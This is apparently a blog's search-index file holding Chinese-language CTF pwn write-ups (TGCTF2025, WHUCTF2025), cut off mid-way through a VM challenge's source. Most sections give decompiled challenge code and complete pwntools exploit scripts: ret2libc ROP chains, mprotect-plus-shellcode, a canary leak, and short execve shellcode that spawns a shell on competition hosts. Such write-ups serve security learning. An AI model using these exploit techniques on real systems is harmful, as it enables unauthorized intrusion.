<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TGCTF2025</title>
      <link href="/2025/05/02/TGCTF2025/"/>
      <url>/2025/05/02/TGCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>简单的retlibc,源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;As a student who has been learning pwn for half a year\n&quot;</span></span><br><span class="line">    <span class="string">&quot;basic ROP is an essential skill that everyone should master. \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Therefore, hurry up and complete the check-in. \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Welcome to the Hangzhou Normal University CTF competition, please leave your name.&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无需多言，直接放wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">31903</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./tgctf_sign&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./tgctf_sign&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401176</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">main=<span class="number">0x401178</span></span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(main)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name.&#x27;</span>,payload1)</span><br><span class="line">puts_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=puts_add-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_add)+p64(sys_add)+p64(main)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>]; <span class="comment">// [esp+0h] [ebp-D0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+C8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;could you tell me your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">256</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i heard you love gets,right?&quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ida分析时发现这是一道32位静态链接的题目，不考虑ret2libc。<br>题目开启了canary和NX，又是静态题目，我们考虑写入shellcode并执行mprotect函数提升权限<br>看调用gets函数的汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call    gets</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">lea     esp, [ebp-8]</span><br><span class="line">pop     ecx</span><br><span class="line">pop     ebx</span><br><span class="line">pop     ebp</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>发现返回地址是ecx-4，而ecx的值是ebp-8处的值，于是我们可以通过覆盖ebp-8处的值来修改返回地址，这样就不会影响canary,此处改为我们可以写入的name<br>我们事先在name处写入调用mpeotect函数的rop链，提升权限为7，然后写入shellcode<br>注意mprotect函数第一个参数地址必须是一个内存页的起始地址（0x1000的整数倍），并且区间长度len必须是页大小的整数倍<br>最后就可getshell<br><br>wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote()</span></span><br><span class="line">r=process(<span class="string">&#x27;./tgctf_overflow&#x27;</span>)</span><br><span class="line">mprotect_add=<span class="number">0x8070A70</span></span><br><span class="line">puts_add=<span class="number">0x80527D0</span></span><br><span class="line">name_pro=<span class="number">0x80EF000</span></span><br><span class="line">name=<span class="number">0x80ef320</span></span><br><span class="line">canary=name+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">shellcode=p32(mprotect_add)+p32(name+<span class="number">20</span>)+p32(name_pro)+p32(<span class="number">0x1000</span>)+p32(<span class="number">7</span>)+asm(shellcraft.sh())</span><br><span class="line">payload1=shellcode.rjust(<span class="number">256</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">len</span>(shellcode))</span><br><span class="line">r.sendafter(<span class="string">b&#x27;could you tell me your name?&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc8</span>+p32(name+<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;i heard you love gets,right?&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello hacker&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;try to show your strength &quot;</span>);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x12u</span>LL);</span><br><span class="line">  mprotect(buf, <span class="number">0x1000u</span>LL, <span class="number">4</span>);</span><br><span class="line">  sub_11C9((__int64)buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_11c9函数的源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_11C9</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rdi &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以输入0x12字节的shellcode，最后直接执行，gdb调试得知执行时我们输入的shellcode时候寄存器全部清零，除了rip指向{jmp rdi}和rdi指向我们输入的shellcode<br>于是我们写短的shellcode即可<br>由于只有0x12字节，使用栈来传入&#x2F;bin&#x2F;sh是行不通的，由于有rdi指向我们输入的shellcode，可以利用这一点直接写&#x2F;bin&#x2F;sh，然后add rdi即可实现&#x2F;bin&#x2F;sh的传入<br>最后令eax为execve的系统调用号，再syscall就可getshell<br>wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./tgctf_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote()</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov eax,0x3b</span></span><br><span class="line"><span class="string">        add rdi,0x8</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">shellcode+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;strength &#x27;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>笔者的ida反汇编不出这题的源码（悲，硬着头皮看汇编做不太现实，遂放弃</p>]]></content>
      
      
      <categories>
          
          <category> CTF_pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WHUCTF2025</title>
      <link href="/2025/05/02/WHUCTF2025/"/>
      <url>/2025/05/02/WHUCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="repeater-handout"><a href="#repeater-handout" class="headerlink" title="repeater_handout"></a>repeater_handout</h2><h3 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h3><p>题目源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;When Siesta was chatting with Rin-chan, he was so engrossed that he couldn&#x27;t hear what Mio and Rinpo were saying. He&quot;</span></span><br><span class="line">    <span class="string">&quot; just repeated their words to brush them off&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choose your option: \n1. input\n2. repeat\n3. exit&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先放wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;125.220.147.47&#x27;</span>,<span class="number">49739</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./repeater_handout&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./repeater_handout&#x27;</span>)</span><br><span class="line">pop_rdi_offset=<span class="number">0x02a3e5</span></span><br><span class="line">ret_offset=<span class="number">0x029139</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload0=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">r.send(payload0)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">25</span>)</span><br><span class="line">canary=u64(r.recv()[<span class="number">25</span>:<span class="number">32</span>].rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">16</span></span><br><span class="line">r.send(payload1)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">40</span>)</span><br><span class="line">ret_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">__libc_start_main_add=ret_add+<span class="number">48</span></span><br><span class="line">libcbase=__libc_start_main_add-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">pop_rdi_add=libcbase+pop_rdi_offset</span><br><span class="line">ret=libcbase+ret_offset</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_add)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>基本的栈溢出，有canary保护和NX保护，打ret2libc<br>溢出先覆盖canary的最低字节处的\x00，防止输出被截断，成功泄露canary，下一次溢出就可以绕过canary泄露出栈上的返回地址<br>接下来gdb调试一下得出泄露的返回地址与__libc_start_main函数的偏移，就成功泄露libc<br>此处注意在gdb时发现无法直接在main函数处下断点，现在知道__libc_start_main函数的第一个参数就是main函数地址，在__libc_start_main处下断点再查看rdi信息就可以得到main函数的地址了<br>尤其注意最后加上一个ret片段来完成栈对齐<br>知识引申：_start函数调用__libc_start_main函数，__libc_start_main函数中的一段，被称为__libc_start_call_main（在调试时可以看到）调用main函数，main函数返回时会返回到__libc_start_main函数的某一偏移处，接着调用exit函数，结束<br></p><h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>先放wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;system&quot;</span>]-libc.sym[<span class="string">&quot;printf&quot;</span>]))</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;125.220.147.47&#x27;</span>,<span class="number">49761</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;\x01&quot;</span>+p8(<span class="number">0x70</span>)+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x80</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01\x07\x06\x81\x03&quot;</span>+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x81</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01\x01\x06\x82\x04&quot;</span>+<span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x82</span>)</span><br><span class="line">payload+=<span class="string">b&quot;\x01s&quot;</span>+ <span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x0</span>)+ <span class="string">b&quot;\x01h&quot;</span>+ <span class="string">b&quot;\x05&quot;</span>+p8(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input length: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">r.sendafter(<span class="string">b&quot;input code: &quot;</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这是一道虚拟机题目，一般源码很长，但漏洞点一般就一些，其他选项是迷惑<br>题目的虚拟机实现的源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_12AE</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+26h] [rbp-2Ah]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+27h] [rbp-29h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span 